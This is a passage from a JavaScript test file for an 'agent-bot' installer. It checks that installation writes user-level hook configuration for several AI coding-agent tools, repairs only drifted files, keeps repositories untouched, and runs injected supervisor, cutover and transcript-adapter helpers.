  values.delete('qwts.chainedHooksPath');
  const migrated = await installAgentBot({
    home,
    run,
    installCli: () => installationPaths(home).executable,
    installHooks: () => installationPaths(home).hooksDir,
    ensureSupervisor: async () => ({ applied: true, loaded: true, unitPath: 'test' }),
    ensureCutover: () => ({ applied: false, reason: 'nothing-to-move' }),
  });
  assert.equal(migrated.chainedHooksPath, null);
});

test('machine install writes the known harness adapters into the user directory', async () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-user-hooks-'));
  const values = new Map();
  const run = (args) => {
    const key = args.at(-1);
    if (args.includes('--get')) {
      if (!values.has(key)) {
        const error = new Error('unset');
        error.status = 1;
        throw error;
      }
      return values.get(key);
    }
    if (args.includes('--unset-all')) return '';
    values.set(args.at(-2), args.at(-1));
    return '';
  };
  await installAgentBot({
    home,
    run,
    installCli: () => installationPaths(home).executable,
    installHooks: () => installationPaths(home).hooksDir,
    ensureSupervisor: async () => ({ applied: true, loaded: true, unitPath: 'test' }),
    ensureCutover: () => ({ applied: false, reason: 'nothing-to-move' }),
    installTranscriptAdapter: () => ({ status: 'not_applicable' }),
  });
  assert.equal(existsSync(join(home, '.claude', 'settings.json')), true);
  assert.equal(existsSync(join(home, '.codex', 'hooks.json')), true);
  assert.equal(existsSync(join(home, '.cursor', 'hooks.json')), true);
  assert.equal(existsSync(join(home, '.copilot', 'hooks', 'agent-bot.json')), true);
  assert.equal(existsSync(join(home, '.windsurf', 'hooks.json')), true);
  assert.equal(existsSync(join(home, '.github', 'hooks', 'agent-bot.json')), false);
});

// #979 (from managed-machine#161): machine wiring is the trigger. Bootstrap
// and `agent-bot update` (which runs this same install) write every known
// harness's user-level hooks with no detection, so a harness added later
// finds its hooks already there; a rerun rewrites only drift, and nothing is
// written into a repository.
test('machine wiring installs user-level hooks for every known harness once and repairs only drift (#979)', async () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-harness-added-'));
  const repo = mkdtempSync(join(tmpdir(), 'agent-bot-harness-repo-'));
  execFileSync('git', ['init', '-q', repo]);
  const env = { HOME: home };
  const run = (args) => {
    if (args.includes('--get')) throw Object.assign(new Error('unset'), { status: 1 });
    return '';
  };
  const wire = () => installAgentBot({
    home,
    env,
    run,
    embeddingApp: null,
    installCli: () => installationPaths(home).executable,
    installHooks: () => installationPaths(home).hooksDir,
    ensureSupervisor: async () => ({ applied: true, loaded: true, unitPath: 'test' }),
    ensureCutover: () => ({ applied: false, reason: 'nothing-to-move' }),
    installTranscriptAdapter: () => ({ status: 'not_applicable' }),
  });
  const userFiles = DIALECTS.filter((row) => row.homeFile).map((row) => hookHomePath(row, home, env));
  assert.ok(userFiles.length > 0);
  const snapshot = () => userFiles.map((file) => [file, readFileSync(file, 'utf8'), statSync(file).mtimeMs]);

  // First wiring, before any harness is installed: every harness's file.
  const first = await wire();
  for (const file of userFiles) assert.equal(existsSync(file), true, file);
  assert.ok(first.userHooks.length >= userFiles.length);

  // Cursor is installed afterwards and rewrites its hooks file with one of
  // the person's own hooks; the next wiring repairs only that drift, keeping
  // the harness's own keys and the foreign hook exactly as they were.
  const cursor = join(home, '.cursor', 'hooks.json');
  const ownHook = { command: '/usr/local/bin/my-own-stop-hook' };
  writeFileSync(cursor, `${JSON.stringify({ version: 1, hooks: { stop: [ownHook] } })}\n`);
  const repaired = await wire();
  assert.deepEqual(repaired.userHooks, [cursor]);
  const cursorHooks = JSON.parse(readFileSync(cursor, 'utf8'));
  assert.equal(cursorHooks.version, 1);
  assert.deepEqual(cursorHooks.hooks.stop.filter((entry) => !JSON.stringify(entry).includes(MANAGED_MARKER)), [ownHook]);
  assert.ok(Object.values(cursorHooks.hooks).flat().some((entry) => JSON.stringify(entry).includes(MANAGED_MARKER)));

  // A second run finds every file current and changes nothing.
  const before = snapshot();
  const again = await wire();
  assert.deepEqual(again.userHooks, []);
  assert.deepEqual(snapshot(), before);

  // Hooks live in the user directories only, never in a repository.
  assert.equal(existsSync(join(repo, '.cursor', 'hooks.json')), false);
  assert.deepEqual(readdirSync(repo), ['.git']);
});

test('agent-bot update runs the same machine install as bootstrap (#979)', () => {
  const source = readFileSync(new URL('../update.mjs', import.meta.url), 'utf8');
  assert.match(source, /import \{ main as install \} from '\.\/install\.mjs';/);
  assert.match(source, /return install\(argv\);/);
});

test('install writes the supervisor through the injected helper and does not disable it', async () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-supervisor-install-'));
  const calls = [];
  const run = (args) => {
    if (args.includes('--get')) {
      const error = new Error('unset');
      error.status = 1;
      throw error;
    }
    return '';
  };
  const first = await installAgentBot({
    home,
    run,
    installCli: () => installationPaths(home).executable,
    installHooks: () => installationPaths(home).hooksDir,
    ensureSupervisor: async (options) => {
      calls.push(['ensure', options.executable]);
      return { applied: true, loaded: true, unitPath: 'unit', refreshed: true };
    },
    ensureCutover: () => ({ applied: false, reason: 'nothing-to-move' }),
  });
  const second = await installAgentBot({
    home,
    run,
    installCli: () => installationPaths(home).executable,
    installHooks: () => installationPaths(home).hooksDir,
    ensureSupervisor: async (options) => {
      calls.push(['ensure', options.executable]);
      return { applied: true, loaded: true, unitPath: 'unit', refreshed: false };
    },
    ensureCutover: () => ({ applied: false, reason: 'nothing-to-move' }),
  });
  assert.equal(first.supervisor.loaded, true);
  assert.equal(second.supervisor.loaded, true);
  assert.deepEqual(calls, [
    ['ensure', installationPaths(home).executable],
    ['ensure', installationPaths(home).executable],
  ]);
});

test('inside an app, install leaves the daemon to the app; outside, it installs it (#968)', async () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-app-supervisor-'));
  const run = (args) => {
    if (args.includes('--get')) throw Object.assign(new Error('unset'), { status: 1 });
    return '';
  };
  const install = (embeddingApp, calls) => installAgentBot({
    home,
    run,
    embeddingApp,
    installCli: (options) => {
      calls.push(['cli', options.embeddingApp]);
      return installationPaths(home).executable;
    },
    installHooks: () => installationPaths(home).hooksDir,
    ensureSupervisor: async (options) => {
      calls.push(['ensure', options.executable]);
      return { applied: true, loaded: true, unitPath: 'unit' };
    },
    ensureCutover: () => ({ applied: false, reason: 'nothing-to-move' }),
    installTranscriptAdapter: () => ({ status: 'not_applicable' }),
  });

  const inside = [];
  const app = await install(GENIUSBAR, inside);
  assert.deepEqual(inside, [['cli', GENIUSBAR]]);
  assert.deepEqual(app.supervisor, { applied: false, reason: 'app-managed', app: GENIUSBAR });
  // The hooks still install.
  assert.equal(app.hooksPath, installationPaths(home).hooksDir);

  const outside = [];
  const checkout = await install(null, outside);
  assert.deepEqual(outside, [['cli', null], ['ensure', installationPaths(home).executable]]);
  assert.equal(checkout.supervisor.applied, true);
});

test('install provisions the account transcript adapter from the installed runtime config', async () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-adapter-install-'));
  const configPath = join(home, '.config', 'agent-bot', 'config.json');
  mkdirSync(dirname(configPath), { recursive: true });
  writeFileSync(configPath, JSON.stringify({ apps: { claude: 'example-claude-agent' }, features: { 'github-identity': true } }));
  const result = await installAgentBot({
    home, env: { HOME: home, AGENT_BOT_ACCOUNT: 'example-claude-agent' },
    run: (args) => {
      if (args.includes('--get')) throw Object.assign(new Error('unset'), { status: 1 });
      return '';
    },
    installCli: () => installationPaths(home).executable,
    installHooks: () => installationPaths(home).hooksDir,
    ensureSupervisor: async () => ({ applied: false }),
    ensureCutover: () => ({ applied: false }),
  });
  assert.equal(result.transcriptAdapter.updated, true);
  const settings = JSON.parse(readFileSync(join(home, '.claude', 'settings.json'), 'utf8'));
  assert.equal(settings.hooks.WorktreeCreate.length, 1);
});

test('install runs the spaces cutover through the injected helper', async () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-cutover-install-'));
  const calls = [];
  const run = (args) => {
    if (args.includes('--get')) {
      const error = new Error('unset');
      error.status = 1;
      throw error;
    }
    return '';
  };
  const result = await installAgentBot({
    home,
    env: { HOME: home },
    run,
    installCli: () => installationPaths(home).executable,
    installHooks: () => installationPaths(home).hooksDir,
    ensureSupervisor: async () => ({ applied: true, loaded: true, unitPath: 'unit' }),
    ensureCutover: (options) => {
      calls.push({ home: options.home, envHome: options.env.HOME });
      return { applied: true, from: '/legacy', to: '/dest', moved: 2 };
    },
  });
  assert.deepEqual(result.cutover, { applied: true, from: '/legacy', to: '/dest', moved: 2 });
  assert.deepEqual(calls, [{ home, envHome: home }]);
});
